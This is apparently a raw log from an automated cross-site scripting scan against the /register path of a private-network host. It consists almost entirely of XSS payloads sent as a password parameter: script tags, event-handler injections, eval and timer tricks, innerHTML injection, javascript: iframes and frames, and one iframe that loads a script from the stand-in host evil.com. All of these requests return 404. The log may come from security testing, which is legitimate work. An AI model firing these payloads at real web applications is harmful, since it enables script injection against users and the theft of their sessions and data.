+2025-01-29 22:53:34,263 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<input type="button" value="Click me" onclick="alert('XSS')">: 404
+2025-01-29 22:53:34,636 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:35,002 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Ctextarea%20onfocus="alert('XSS')"%3ETest%3C/textarea%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:35,002 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<textarea onfocus="alert('XSS')">Test</textarea>: 404
+2025-01-29 22:53:35,376 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:35,755 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Ewindow['eval']('alert("XSS")')%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:35,756 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>window['eval']('alert("XSS")')</script>: 404
+2025-01-29 22:53:36,122 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:36,498 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Ewindow['setInterval']('alert("XSS")',%201000)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:36,499 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>window['setInterval']('alert("XSS")', 1000)</script>: 404
+2025-01-29 22:53:36,870 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:37,217 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Ewindow['setTimeout']('alert("XSS")',%201000)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:37,217 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>window['setTimeout']('alert("XSS")', 1000)</script>: 404
+2025-01-29 22:53:37,582 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:37,947 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Edocument.getElementById('myElem').innerHTML%20=%20'%3Cimg%20src="x"%20onerror="alert(1)"%20/%3E'%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:37,948 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>document.getElementById('myElem').innerHTML = '<img src="x" onerror="alert(1)" />'</script>: 404
+2025-01-29 22:53:38,303 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:38,668 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cscript%3Edocument.getElementById('myElem').innerHTML%20=%20"%3Cscript%3Ealert('XSS')%3C/script%3E"%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:38,668 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<script>document.getElementById('myElem').innerHTML = "<script>alert('XSS')</script>"</script>: 404
+2025-01-29 22:53:39,045 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:39,419 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Ciframe%20src="javascript:alert('XSS')"%20width="0"%20height="0"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:39,419 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<iframe src="javascript:alert('XSS')" width="0" height="0"></iframe>: 404
+2025-01-29 22:53:39,774 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:40,144 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Ciframe%20src="http://evil.com/evil.js"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:40,144 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<iframe src="http://evil.com/evil.js"></iframe>: 404
+2025-01-29 22:53:40,503 - INFO - HTTP Request: GET http://172.20.10.3/register "HTTP/1.1 200 OK"
+2025-01-29 22:53:40,872 - INFO - HTTP Request: GET http://172.20.10.3/register&password=%3Cframe%20src="javascript:alert('XSS')"%3E%3C/frame%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:53:40,872 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/register&password=<frame src="javascript:alert('XSS')"></frame>: 404
